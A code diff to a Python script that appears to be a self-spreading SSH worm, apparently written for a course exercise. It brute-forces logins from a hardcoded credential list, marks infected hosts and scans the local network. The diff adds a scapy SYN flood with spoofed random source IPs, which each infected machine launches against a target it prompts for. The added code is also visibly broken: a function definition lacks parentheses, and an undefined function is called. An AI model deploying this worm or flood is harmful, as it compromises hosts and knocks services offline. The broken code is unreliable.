@@ -3,10 +3,11 @@ import sys
 import socket
 import nmap
 import os
-import sys
 import struct
 import fcntl
 import netifaces
+import random
+from scapy.all import *
 
 # The list of credentials to attempt
 credList = [
@@ -15,7 +16,7 @@ credList = [
 ('root', '#Gig#'),
 ('cpsc', 'cpsc'),
 ('ubuntu', '123456'),
-('cs2019', 'cs2019')
+('victim', 'victim')
 ]
 
 # The file marking whether the worm should spread
@@ -25,6 +26,50 @@ INFECTED_MARKER_FILE = "./infected.txt"
 # Returns whether the worm should spread
 # @return - True if the infection succeeded and false otherwise
 ##################################################################
+def randomIP():
+	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
+	return ip
+
+def randInt():
+	x = random.randint(1000,9000)
+	return x	
+
+def SYN_Flood(dstIP,dstPort,counter):
+	total = 0
+	print "Packets are sending ..."
+	for x in range (0,counter):
+		s_port = randInt()
+		s_eq = randInt()
+		w_indow = randInt()
+
+		IP_Packet = IP ()
+		IP_Packet.src = randomIP()
+		IP_Packet.dst = dstIP
+
+		TCP_Packet = TCP ()	
+		TCP_Packet.sport = s_port
+		TCP_Packet.dport = dstPort
+		TCP_Packet.flags = "S"
+		TCP_Packet.seq = s_eq
+		TCP_Packet.window = w_indow
+
+		send(IP_Packet/TCP_Packet, verbose=0)
+		total+=1
+	sys.stdout.write("\nTotal packets sent: %i\n" % total)
+
+def Flooding_Attack:
+	os.system("clear")
+	print "#############################"
+	print "#    github.com/EmreOvunc   #"
+	print "#############################"
+	print "# Welcome to SYN Flood Tool #"
+	print "#############################"
+
+	dstIP = raw_input ("\nTarget IP : ")
+	dstPort = input ("Target Port : ")
+	
+	return dstIP,int(dstPort)
+
 def isInfectedSystem(ssh):
 	# Check if the system as infected. One
 	# approach is to check for a file called
@@ -49,6 +94,10 @@ def markInfected():
 	file_obj = open(INFECTED_MARKER_FILE, "w")
 	file_obj.write("Has anyone really been far as decided to use even go want to do more like?")
 	file_obj.close()
+
+	dstIP,dstPort = info()
+	counter = input ("How many packets do you want to send : ")
+	SYN_Flood(dstIP,dstPort,int(counter))
 ###############################################################
 # Spread to the other system and execute
 # @param sshClient - the instance of the SSH client connected
@@ -203,7 +252,7 @@ def getMyIP(interface):
 # @return - a list of IP addresses on the same network
 #######################################################
 def getHostsOnTheSameNetwork():
-	
+
 	# TODO: Add code for scanning
 	# for hosts on the same network
 	# and return the list of discovered
@@ -218,6 +267,7 @@ def getHostsOnTheSameNetwork():
 			liveHosts.append(host)
 
 	return liveHosts
+
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
